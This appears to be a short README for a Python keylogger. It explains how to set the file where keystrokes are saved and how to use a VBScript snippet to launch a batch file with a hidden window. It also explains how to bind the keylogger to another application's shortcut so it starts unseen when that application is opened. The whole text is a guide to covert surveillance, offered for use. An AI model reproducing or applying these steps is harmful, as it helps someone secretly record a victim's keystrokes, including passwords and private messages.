# Pykeylogger
Pykeylogger a combination of cmd and the keylogger to start the keylogger with clicking the application
in the .pyw file 
change  file path ("c:/keystrokes/") to your prefered path to save the keystroke text file and save a empty .txt file in the path   

change the two paths in batchconnect.txt
save batchconnect.txt as .bat

now you integrate .vbs into your .bat file for an invisible start of the command line

Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "C:\(batchconnect path)batchconnect.bat" & Chr(34), 0
Set WshShell = Nothing

change the c:\ path to the batchconnect.bat path save the document as .vbs 

right click the application you bound to your keylogger click settings then shortcuts then target and then you copy paste your vbs path in there 
